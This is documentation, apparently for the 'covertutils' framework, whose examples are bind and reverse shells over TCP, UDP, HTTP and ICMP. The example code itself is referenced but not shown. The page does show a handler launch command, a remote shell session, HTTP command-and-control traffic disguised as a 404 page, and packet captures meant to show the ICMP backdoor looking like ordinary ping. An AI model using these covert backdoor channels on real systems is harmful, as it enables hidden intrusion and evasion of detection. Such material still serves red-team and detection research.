
.. _programming_examples :

Programming Examples
=====================

Examples can be run using the makefile available in the repo, as shown below:

.. code :: bash

	make EX='examples/example_script.py 8080' run


Notice that examples have to be tested in pairs (agents - handlers).


Simple TCP Bind Shell
---------------------

Server - Agent
****************

.. literalinclude:: ../examples/tcp_bind_agent.py


Client - Handler
****************

.. literalinclude:: ../examples/tcp_bind_handler.py


.. _rev_tcp :

Simple TCP Reverse Shell
------------------------

Client - Agent
****************

.. literalinclude:: ../examples/tcp_reverse_agent.py


Server - Handler
****************

.. literalinclude:: ../examples/tcp_reverse_handler.py



Simple UDP Reverse Shell
-------------------------

Client - Agent
***************

.. literalinclude:: ../examples/udp_reverse_agent.py


Server - Handler
****************

.. literalinclude:: ../examples/udp_reverse_handler.py



Advanced HTTP Reverse Shell
---------------------------

Client - Agent
***************

.. literalinclude:: ../examples/http_reverse_agent.py


Server - Handler
****************

.. literalinclude:: ../examples/http_reverse_handler.py


Please notice that this example will work for only 1 reverse connection. Other connections will jam as of the Cycling Encryption Key.
A real project would use HTTP Cookies along with :func:`Orchestrator.getIdentity()` and :func:`Orchestrator.checkIdentity()` to achieve session management.


Traffic Sample
**************


**HTTP Request** ::

	GET /search.php?q=01e45e90?userid=6c8a34140ef540caa9acc5221ca3be54bc1425 HTTP/1.1
	Host: {0}
	Cookie: SESSIOID=6626d881415241b388b44b52837465e4ed2b2504f9f16893716c25a1f81e9c5809b5485281acf68327ada9d3c6be170afb3ff5ac8d4de0e77e3dd9eeb089fbe1
	eTag: c9262c8fa9cf36472fc556f39f9446c25c5433


**HTTP Response** ::

	HTTP/1.1 404 Not Found
	Date: Sun, 18 Oct 2012 10:36:20 GMT
	Server: Apache/2.2.14 (Win32)
	Content-Length: 363
	Connection: Closed
	Content-Type: text/html; charset=iso-8859-1

	<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
	<html>
	<head>
	   <title>404 Not Found</title>
	</head>
	<body>
	   <h1>Not Found</h1>
	   <p>The requested URL was not found on this server.</p>
	</body>
	<!-- Reference Code: d90a2b5e614c0b0a28c438e8100f16537f854c5a193
	c0b7da2ca674b2583cf328fe7f7f0cf49e8932ce9dd5f08a362c92f7d923867ffb4b196b885461e12a892
	-->
	</html>



.. _icmp_bind_example:

Advanced ICMP Bind Shell
---------------------------
This example uses the Legendary Scapy_ package to parse and create Raw Packets. It can be also implemented using :class:`StegoOrchestrator` class, if Scapy dependency is a bummer.
Windows users will need Npcap_ to use Scapy. Python Raw Sockets do not seem to have this dependency.

As this backdoor uses Raw Sockets, **root** permissions are needed.

.. _Scapy: http://www.secdev.org/projects/scapy/
.. _Npcap: https://nmap.org/npcap/

Server - Agent
***************

.. literalinclude:: ../examples/icmp_bind_agent.py


Client - Handler
****************

.. literalinclude:: ../examples/icmp_bind_handler.py


Traffic Sample
**************

**Backdoor's Traffic**

.. code:: bash

	make EX='examples/icmp_bind_handler.py 127.0.0.5 pass 0.1' run
	PYTHONPATH=".:" examples/icmp_bind_handler.py 127.0.0.5 pass 0.1
	(covertutils v0.1.1)[control]>
	(covertutils v0.1.1)[control]>
	(covertutils v0.1.1)[control]> !main
	(covertutils v0.1.1)[main]> ls -la
	(covertutils v0.1.1)[main]>
	total 120
	drwxr-xr-x 15 unused unused 4096 Jun 15 06:12 .
	drwxr-xr-x 20 unused unused 4096 Jun 14 23:48 ..
	drwxr-xr-x  3 unused unused 4096 Jun 14 23:13 build
	drwxr-xr-x  3 unused unused 4096 Jun  2 13:42 .cache
	-rw-r--r--  1 unused unused  904 Jun  2 13:42 cov-badge.svg
	-rw-r--r--  1 unused unused 6563 Jun  8 14:10 .coverage
	drwxr-xr-x  9 unused unused 4096 Jun 14 20:44 covertutils
	drwxr-xr-x  2 unused unused 4096 Jun  2 13:42 covertutils.egg-info
	drwxr-xr-x  2 unused unused 4096 Jun  2 13:42 dist
	drwxr-xr-x  4 unused unused 4096 Jun 14 21:15 docs
	drwxr-xr-x  3 unused unused 4096 Jun  2 13:42 .eggs
	drwxr-xr-x  2 unused unused 4096 Jun 15 05:47 examples
	drwxr-xr-x  8 unused unused 4096 Jun 15 06:03 .git
	-rw-r--r--  1 unused unused  129 Jun  2 13:42 .gitignore
	drwxr-xr-x  2 unused unused 4096 Jun  8 14:10 htmlcov
	-rw-r--r--  1 unused unused 1107 Jun  8 12:20 makefile
	-rw-r--r--  1 unused unused 1509 Jun 14 23:13 MANIFEST
	-rw-r--r--  1 unused unused   36 Jun  2 13:42 MANIFEST.in
	-rw-r--r--  1 unused unused  845 Jun  8 14:19 shell_manual_test.py
	drwxr-xr-x  2 unused unused 4096 Jun  8 16:11 __pycache__
	-rw-------  1 unused unused  242 Jun  2 13:42 .pypirc
	-rw-r--r--  1 unused unused 3678 Jun  2 13:42 README.md
	-rw-r--r--  1 unused unused    8 Jun  3 10:40 requirements.txt
	-rw-r--r--  1 unused unused  755 Jun  2 13:42 setup.py
	-rw-r--r--  1 unused unused  865 Jun  3 10:32 setup.pyc
	drwxr-xr-x  3 unused unused 4096 Jun 14 20:42 tests
	drwxr-xr-x  6 unused unused 4096 Jun  2 13:42 .tox
	-rw-r--r--  1 unused unused  385 Jun  2 13:42 tox.ini
	-rw-r--r--  1 unused unused  329 Jun  2 13:42 .travis.yml


	(covertutils v0.1.1)[main]>
	Really Control-C [y/N]? y
	Aborted by the user...



.. code:: bash

	tcpdump -i lo icmp -vv -nn
	tcpdump: listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
	08:31:54.810249 IP (tos 0x0, ttl 64, id 39362, offset 0, flags [DF], proto ICMP (1), length 84)
	    127.0.0.1 > 127.0.0.5: ICMP echo request, id 5796, seq 1, length 64
	08:31:54.862667 IP (tos 0x0, ttl 64, id 36489, offset 0, flags [none], proto ICMP (1), length 84)
	    127.0.0.5 > 127.0.0.1: ICMP echo reply, id 5796, seq 1, length 64
	08:31:54.990472 IP (tos 0x0, ttl 64, id 53551, offset 0, flags [DF], proto ICMP (1), length 84)
	    127.0.0.1 > 127.0.0.5: ICMP echo request, id 5796, seq 2, length 64
	08:31:55.018247 IP (tos 0x0, ttl 64, id 48089, offset 0, flags [none], proto ICMP (1), length 84)
	    127.0.0.5 > 127.0.0.1: ICMP echo reply, id 5796, seq 2, length 64
	08:31:55.165880 IP (tos 0x0, ttl 64, id 53467, offset 0, flags [DF], proto ICMP (1), length 84)
	    127.0.0.1 > 127.0.0.5: ICMP echo request, id 5796, seq 3, length 64
	08:31:55.205429 IP (tos 0x0, ttl 64, id 40848, offset 0, flags [none], proto ICMP (1), length 84)
	    127.0.0.5 > 127.0.0.1: ICMP echo reply, id 5796, seq 3, length 64
	08:31:55.362147 IP (tos 0x0, ttl 64, id 55081, offset 0, flags [DF], proto ICMP (1), length 84)
	    127.0.0.1 > 127.0.0.5: ICMP echo request, id 5796, seq 4, length 64
	08:31:55.390401 IP (tos 0x0, ttl 64, id 39089, offset 0, flags [none], proto ICMP (1), length 84)
	    127.0.0.5 > 127.0.0.1: ICMP echo reply, id 5796, seq 4, length 64
	08:31:55.525458 IP (tos 0x0, ttl 64, id 38271, offset 0, flags [DF], proto ICMP (1), length 84)
	    127.0.0.1 > 127.0.0.5: ICMP echo request, id 5796, seq 5, length 64
	08:31:55.554284 IP (tos 0x0, ttl 64, id 28862, offset 0, flags [none], proto ICMP (1), length 84)
	    127.0.0.5 > 127.0.0.1: ICMP echo reply, id 5796, seq 5, length 64
	08:31:55.697674 IP (tos 0x0, ttl 64, id 53618, offset 0, flags [DF], proto ICMP (1), length 84)
	    127.0.0.1 > 127.0.0.5: ICMP echo request, id 5796, seq 6, length 64
	08:31:55.733123 IP (tos 0x0, ttl 64, id 38177, offset 0, flags [none], proto ICMP (1), length 84)
	    127.0.0.5 > 127.0.0.1: ICMP echo reply, id 5796, seq 6, length 64
	08:31:55.878168 IP (tos 0x0, ttl 64, id 28090, offset 0, flags [DF], proto ICMP (1), length 84)
	    127.0.0.1 > 127.0.0.5: ICMP echo request, id 5796, seq 7, length 64
	08:31:55.909602 IP (tos 0x0, ttl 64, id 17611, offset 0, flags [none], proto ICMP (1), length 84)
	    127.0.0.5 > 127.0.0.1: ICMP echo reply, id 5796, seq 7, length 64
	^C
	14 packets captured
	28 packets received by filter
	0 packets dropped by kernel



**Linux Ping Traffic**

.. code:: bash

	ping -c 7 127.0.0.5
	PING 127.0.0.5 (127.0.0.5) 56(84) bytes of data.
	64 bytes from 127.0.0.5: icmp_seq=1 ttl=64 time=0.031 ms
	64 bytes from 127.0.0.5: icmp_seq=2 ttl=64 time=0.047 ms
	64 bytes from 127.0.0.5: icmp_seq=3 ttl=64 time=0.053 ms
	64 bytes from 127.0.0.5: icmp_seq=4 ttl=64 time=0.053 ms
	64 bytes from 127.0.0.5: icmp_seq=5 ttl=64 time=0.050 ms
	64 bytes from 127.0.0.5: icmp_seq=6 ttl=64 time=0.050 ms
	64 bytes from 127.0.0.5: icmp_seq=7 ttl=64 time=0.052 ms

	--- 127.0.0.5 ping statistics ---
	7 packets transmitted, 7 received, 0% packet loss, time 6149ms
	rtt min/avg/max/mdev = 0.031/0.048/0.053/0.007 ms



.. code:: bash

	tcpdump -i lo icmp -vv -nn
	tcpdump: listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
	08:23:43.511965 IP (tos 0x0, ttl 64, id 65001, offset 0, flags [DF], proto ICMP (1), length 84)
	    127.0.0.1 > 127.0.0.5: ICMP echo request, id 34064, seq 1, length 64
	08:23:43.511975 IP (tos 0x0, ttl 64, id 34349, offset 0, flags [none], proto ICMP (1), length 84)
	    127.0.0.5 > 127.0.0.1: ICMP echo reply, id 34064, seq 1, length 64
	08:23:44.541260 IP (tos 0x0, ttl 64, id 65026, offset 0, flags [DF], proto ICMP (1), length 84)
	    127.0.0.1 > 127.0.0.5: ICMP echo request, id 34064, seq 2, length 64
	08:23:44.541273 IP (tos 0x0, ttl 64, id 34539, offset 0, flags [none], proto ICMP (1), length 84)
	    127.0.0.5 > 127.0.0.1: ICMP echo reply, id 34064, seq 2, length 64
	08:23:45.565248 IP (tos 0x0, ttl 64, id 65215, offset 0, flags [DF], proto ICMP (1), length 84)
	    127.0.0.1 > 127.0.0.5: ICMP echo request, id 34064, seq 3, length 64
	08:23:45.565262 IP (tos 0x0, ttl 64, id 34742, offset 0, flags [none], proto ICMP (1), length 84)
	    127.0.0.5 > 127.0.0.1: ICMP echo reply, id 34064, seq 3, length 64
	08:23:46.588884 IP (tos 0x0, ttl 64, id 65448, offset 0, flags [DF], proto ICMP (1), length 84)
	    127.0.0.1 > 127.0.0.5: ICMP echo request, id 34064, seq 4, length 64
	08:23:46.588898 IP (tos 0x0, ttl 64, id 34956, offset 0, flags [none], proto ICMP (1), length 84)
	    127.0.0.5 > 127.0.0.1: ICMP echo reply, id 34064, seq 4, length 64
	08:23:47.612154 IP (tos 0x0, ttl 64, id 65491, offset 0, flags [DF], proto ICMP (1), length 84)
	    127.0.0.1 > 127.0.0.5: ICMP echo request, id 34064, seq 5, length 64
	08:23:47.612167 IP (tos 0x0, ttl 64, id 35125, offset 0, flags [none], proto ICMP (1), length 84)
	    127.0.0.5 > 127.0.0.1: ICMP echo reply, id 34064, seq 5, length 64
	08:23:48.636315 IP (tos 0x0, ttl 64, id 131, offset 0, flags [DF], proto ICMP (1), length 84)
	    127.0.0.1 > 127.0.0.5: ICMP echo request, id 34064, seq 6, length 64
	08:23:48.636328 IP (tos 0x0, ttl 64, id 35315, offset 0, flags [none], proto ICMP (1), length 84)
	    127.0.0.5 > 127.0.0.1: ICMP echo reply, id 34064, seq 6, length 64
	08:23:49.661129 IP (tos 0x0, ttl 64, id 151, offset 0, flags [DF], proto ICMP (1), length 84)
	    127.0.0.1 > 127.0.0.5: ICMP echo request, id 34064, seq 7, length 64
	08:23:49.661142 IP (tos 0x0, ttl 64, id 35362, offset 0, flags [none], proto ICMP (1), length 84)
	    127.0.0.5 > 127.0.0.1: ICMP echo reply, id 34064, seq 7, length 64
	^C
	14 packets captured
	28 packets received by filter
	0 packets dropped by kernel


**It is no copy-paste**

*You can say from the IP identification fields...*
